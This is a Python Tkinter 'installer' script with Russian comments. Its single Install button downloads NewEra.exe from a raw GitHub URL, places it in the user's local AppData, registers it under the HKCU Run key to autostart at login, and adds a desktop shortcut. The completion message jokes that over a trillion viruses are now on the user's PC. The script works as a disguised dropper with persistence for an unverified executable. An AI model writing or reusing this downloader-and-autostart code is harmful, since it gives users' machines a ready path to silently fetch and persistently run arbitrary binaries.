import os
import shutil
import winreg
import urllib.request
import tkinter as tk
from tkinter import messagebox
import pythoncom
import pywintypes
from PIL import ImageTk, Image
import win32com.client


def create_shortcut():
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')  # Путь к рабочему столу
    app_path = os.path.join(os.environ['LOCALAPPDATA'], 'Programs', 'NewEra', 'NewEra.exe')  # Путь к приложению
    shell = win32com.client.Dispatch("WScript.Shell")  # Создание объекта для работы с ярлыками
    try:
        shortcut = shell.CreateShortCut(os.path.join(desktop_path, "NewEra.lnk"))  # Создание ярлыка
        shortcut.Targetpath = app_path  # Установка пути к приложению
        shortcut.WorkingDirectory = os.path.dirname(app_path)  # Установка рабочей директории приложения
        shortcut.save()  # Сохранение ярлыка
    except pythoncom.com_error:
        messagebox.showerror('Ошибка', 'Не удалось создать ярлык на рабочем столе')
        return
    messagebox.showinfo('Завершение', 'Установка завершена. 1000909045029вирусов на вашем пк :)')


def download_and_install():
    url = "https://raw.githubusercontent.com/Alexsanger/hyeta/main/NewEra.exe"  # URL адрес вашего exe файла
    file_name = "NewEra.exe"  # Имя файла для сохранения
    install_dir = os.path.join(os.environ['LOCALAPPDATA'], 'Programs', 'NewEra')  # Директория установки

    # Скачивание файла
    try:
        with urllib.request.urlopen(url) as response, open(file_name, 'wb') as out_file:
            shutil.copyfileobj(response, out_file)
    except:
        messagebox.showerror('Ошибка', 'Не удалось загрузить файл')
        return

    # Установка программы
    try:
        os.mkdir(install_dir)
    except:
        pass
    try:
        shutil.move(file_name, os.path.join(install_dir, file_name))
    except:
        messagebox.showerror('Ошибка', 'Не удалось установить программу')
        return

    # Добавление в автозагрузку
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "NewEra", 0, winreg.REG_SZ, os.path.join(install_dir, file_name))
        key.Close()
    except:
        messagebox.showerror('Ошибка', 'Не удалось добавить программу в автозагрузку')
        return

    create_shortcut()



root = tk.Tk()
root.geometry("400x400")

# Создание Canvas объекта и добавление изображения на него
install_button = tk.Button(text="Установить", command=download_and_install)
install_button.pack()

root.mainloop()